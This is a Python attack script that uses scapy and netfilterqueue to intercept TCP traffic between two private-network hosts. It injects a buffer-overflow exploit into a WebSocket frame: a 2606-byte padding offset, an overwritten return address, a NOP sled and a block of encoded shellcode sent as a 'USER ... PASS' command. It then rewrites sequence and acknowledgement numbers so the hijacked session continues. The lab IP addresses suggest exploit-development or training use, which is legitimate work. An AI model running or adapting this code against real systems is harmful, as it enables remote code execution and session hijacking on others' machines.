#!/usr/bin/env python2.7
from scapy.all import *
from netfilterqueue import NetfilterQueue
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import socket
import os
import sys
import subprocess, signal
import struct
import time
from pprint import pprint

_debug = 0

tcp_seq = 0
tcp_ack = 0
tcp_next_seq = 0
tcp_next_expected_seq = 0
tcp_seq_diff = 0

interception = 0
ether = Ether()
ip = IP()
tcp = TCP()
offset = "A" * 2606
eip = "\x8f\x35\x4a\x5f"
#eip = "BBBB"
noop = "\x90" * 8
#noop = "C" * 8
#shellcode = "D" * 351
shellcode = ("\xdb\xd0\xd9\x74\x24\xf4\xbb\xc8\x9a\xaf\x42\x5d\x29\xc9\xb1"
"\x52\x83\xed\xfc\x31\x5d\x13\x03\x95\x89\x4d\xb7\xd9\x46\x13"
"\x38\x21\x97\x74\xb0\xc4\xa6\xb4\xa6\x8d\x99\x04\xac\xc3\x15"
"\xee\xe0\xf7\xae\x82\x2c\xf8\x07\x28\x0b\x37\x97\x01\x6f\x56"
"\x1b\x58\xbc\xb8\x22\x93\xb1\xb9\x63\xce\x38\xeb\x3c\x84\xef"
"\x1b\x48\xd0\x33\x90\x02\xf4\x33\x45\xd2\xf7\x12\xd8\x68\xae"
"\xb4\xdb\xbd\xda\xfc\xc3\xa2\xe7\xb7\x78\x10\x93\x49\xa8\x68"
"\x5c\xe5\x95\x44\xaf\xf7\xd2\x63\x50\x82\x2a\x90\xed\x95\xe9"
"\xea\x29\x13\xe9\x4d\xb9\x83\xd5\x6c\x6e\x55\x9e\x63\xdb\x11"
"\xf8\x67\xda\xf6\x73\x93\x57\xf9\x53\x15\x23\xde\x77\x7d\xf7"
"\x7f\x2e\xdb\x56\x7f\x30\x84\x07\x25\x3b\x29\x53\x54\x66\x26"
"\x90\x55\x98\xb6\xbe\xee\xeb\x84\x61\x45\x63\xa5\xea\x43\x74"
"\xca\xc0\x34\xea\x35\xeb\x44\x23\xf2\xbf\x14\x5b\xd3\xbf\xfe"
"\x9b\xdc\x15\x50\xcb\x72\xc6\x11\xbb\x32\xb6\xf9\xd1\xbc\xe9"
"\x1a\xda\x16\x82\xb1\x21\xf1\x6d\xed\x8c\x15\x06\xec\xce\x14"
"\x6d\x79\x28\x7c\x81\x2c\xe3\xe9\x38\x75\x7f\x8b\xc5\xa3\xfa"
"\x8b\x4e\x40\xfb\x42\xa7\x2d\xef\x33\x47\x78\x4d\x95\x58\x56"
"\xf9\x79\xca\x3d\xf9\xf4\xf7\xe9\xae\x51\xc9\xe3\x3a\x4c\x70"
"\x5a\x58\x8d\xe4\xa5\xd8\x4a\xd5\x28\xe1\x1f\x61\x0f\xf1\xd9"
"\x6a\x0b\xa5\xb5\x3c\xc5\x13\x70\x97\xa7\xcd\x2a\x44\x6e\x99"
"\xab\xa6\xb1\xdf\xb3\xe2\x47\x3f\x05\x5b\x1e\x40\xaa\x0b\x96"
"\x39\xd6\xab\x59\x90\x52\xdb\x13\xb8\xf3\x74\xfa\x29\x46\x19"
"\xfd\x84\x85\x24\x7e\x2c\x76\xd3\x9e\x45\x73\x9f\x18\xb6\x09"
"\xb0\xcc\xb8\xbe\xb1\xc4")
exploit = b'USER hack::PASS ' + offset + eip + noop + shellcode

def iptables():
    try:
        subprocess.check_call(['iptables', '-F'])
        subprocess.check_call(['iptables', '-I', 'INPUT', '1', '-p', 'tcp',
                               '-s', '192.168.165.10', '--dport', '80',
                               '-j', 'NFQUEUE', '--queue-num', '1'])
        subprocess.check_call(['iptables', '-I', 'OUTPUT', '1', '-p', 'tcp',
                               '-s', '192.168.165.20', '--sport', '80',
                               '-j', 'NFQUEUE', '--queue-num', '1'])
    except CallesProcessError as e:
        sys.stdout.write("Error: %s\n" % str(e))

def kill_process(process):
    p = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
    out, err = p.communicate()

    for line in out.splitlines():
        if process in line:
            pid = int(line.split(None, 1)[0])
            sys.stdout.write("[*] Killing process {0}, PID = {1}\n".format(process, pid))
            os.kill(pid, signal.SIGKILL)

def callback(pkt):
    global tcp_seq, tcp_ack, tcp_next_seq, tcp_next_expected_seq, tcp_seq_diff

    global ether, ip, tcp, interception, exploit
    try:
        p = IP(pkt.get_payload())

        if interception:
            if p[IP].src == '192.168.165.20':
                sys.stdout.write("[*] Modify TCP seq numbers from server...\n")

                ip = IP(version=p[IP].version, ihl=p[IP].ihl, tos=p[IP].tos, len=p[IP].len, \
                        id=p[IP].id, flags=p[IP].flags, frag=p[IP].frag, ttl=p[IP].ttl, \
                        proto=p[IP].proto, src=p[IP].src, \
                        dst=p[IP].dst, options=p[IP].options)
                tcp = TCP(sport=p[TCP].sport, dport=p[TCP].dport, seq=p[TCP].seq+tcp_seq_diff, ack=p[TCP].ack, \
                        dataofs=p[TCP].dataofs, reserved=p[TCP].reserved, \
                        flags=p[TCP].flags, window=p[TCP].window, \
                        urgptr=p[TCP].urgptr, options=p[TCP].options)

                packet = ip/tcp/p[TCP].payload
                pkt.set_payload(str(packet))
                pkt.accept()

            elif p[IP].src == '192.168.165.10':
                sys.stdout.write("[*] Modify TCP ack numbers from client...\n")

                ip = IP(version=p[IP].version, ihl=p[IP].ihl, tos=p[IP].tos, len=p[IP].len, \
                        id=p[IP].id, flags=p[IP].flags, frag=p[IP].frag, ttl=p[IP].ttl, \
                        proto=p[IP].proto, src=p[IP].src, \
                        dst=p[IP].dst, options=p[IP].options)
                tcp = TCP(sport=p[TCP].sport, dport=p[TCP].dport, seq=p[TCP].seq, ack=p[TCP].ack-tcp_seq_diff, \
                        dataofs=p[TCP].dataofs, reserved=p[TCP].reserved, \
                        flags=p[TCP].flags, window=p[TCP].window, \
                        urgptr=p[TCP].urgptr, options=p[TCP].options)

                packet = ip/tcp/tcp.payload
                pkt.set_payload(str(packet))
                pkt.accept()
            else:
                sys.stdout.write("[*] Unmodified/unknown packet...\n")
                pkt.accept()

        elif p[TCP].flags == 24 and p[IP].len >= 100 and p[IP].src == "192.168.165.20":
            sys.stdout.write("[*] Sending modified DATA-ACK packet...\n")

            # WEBSOCKET HEADER:
            #    8 = FIN: True
            #    2 = Opcode: Binary 2 (needs to be != 0)
            #   7e = 126 Extended Payload Length
            websocket_header = '\x82\x7e'

            payload_len_hex = struct.pack(">H", len(exploit))
            payload = websocket_header + payload_len_hex + exploit[0:1444]

            tcp_seq_diff = len(websocket_header + payload_len_hex + exploit) - len(p[TCP].payload)
            exploit = exploit[1444:]

            ip_len = 20 + 32 + len(payload) # IP header + TCP header + payload
            if _debug: sys.stdout.write("[-] DEBUG | IP Lenght: {}\n".format(ip_len))

            tcp_flags = 'A'
            if _debug: sys.stdout.write("[-] DEBUG | TCP Flags: {}\n".format(tcp_flags))

            ether = Ether(dst='00:0c:29:78:40:1a', src='00:0c:29:25:df:87')
            ip = IP(version=p[IP].version, ihl=p[IP].ihl, tos=p[IP].tos, len=ip_len, \
                    id=p[IP].id, flags=p[IP].flags, frag=p[IP].frag, ttl=p[IP].ttl, \
                    proto=p[IP].proto, src=p[IP].src, \
                    dst=p[IP].dst, options=p[IP].options)
            tcp = TCP(sport=p[TCP].sport, dport=p[TCP].dport, seq=p[TCP].seq, ack=p[TCP].ack, \
                    dataofs=p[TCP].dataofs, reserved=p[TCP].reserved, \
                    flags=tcp_flags, window=p[TCP].window, \
                    urgptr=p[TCP].urgptr, options=p[TCP].options)

            pkt.drop()
            sendp(ether/ip/tcp/payload, iface="ens33")

            tcp_seq = p[TCP].seq
            tcp_ack = p[TCP].ack
            tcp_next_seq = tcp_seq + len(payload)
            tcp_next_expected_seq = tcp_seq + len(p[TCP].payload)

        elif p[TCP].flags == 16 and p[TCP].ack == tcp_next_seq and p[IP].src == "192.168.165.10":
            if len(exploit) > 1448:
                sys.stdout.write("[*] Sending modified ACK packet...\n")
                tcp.seq = p[TCP].ack
                payload = exploit[0:1448]
                tcp.flags = 'A'

                pkt.drop()
                sendp(ether/ip/tcp/payload, iface="ens33")
                exploit = exploit[1449:]

                tcp_seq = p[TCP].seq
                tcp_ack = p[TCP].ack
                tcp_next_seq = p[TCP].ack + len(payload)
            else:
                sys.stdout.write("[*] Sending modified PSH-ACK packet...\n")
                tcp.seq = p[TCP].ack
                payload = exploit[0:] + '\n'
                tcp_next_seq = p[TCP].ack + len(payload)
                ip.len = 20 + 32 + len(payload)
                tcp.flags = 'PA'

                pkt.drop()
                sendp(ether/ip/tcp/payload, iface="ens33")
                interception = 1

                tcp_seq = p[TCP].seq
                tcp_ack = p[TCP].ack
                tcp_next_seq = p[TCP].ack + len(payload)
        else:
            if p[IP].src == '192.168.165.20':
                sys.stdout.write("[*] Sending unmodified packet from server...\n")
                pkt.accept()
            elif p[IP].src == '192.168.165.10':
                sys.stdout.write("[*] Sending unmodified packet from client...\n")
                pkt.accept()
            else:
                sys.stdout.write("[*] Unmodified/unknown packet...\n")
                pkt.accept()

    except Exception as e:
        sys.stdout.write("Error: %s\n" % str(e))

sys.stdout.write("[*] Flushing iptables and create NFQUEUE...\n")
iptables()

try:
    QUEUE_NUM = int(os.getenv('QUEUE_NUM', 1))
except ValueError as e:
    sys.stderr.write('Error: env QUEUE_NUM must be integer\n')
    sys.exit(1)

sys.stdout.write("[*] waiting for data on QUEUE: %s\n" % str(QUEUE_NUM))

nfqueue = NetfilterQueue()
nfqueue.bind(QUEUE_NUM, callback)

try:
    nfqueue.run()
except KeyboardInterrupt:
    sys.stdout.write("Exiting...\n")

nfqueue.unbind()
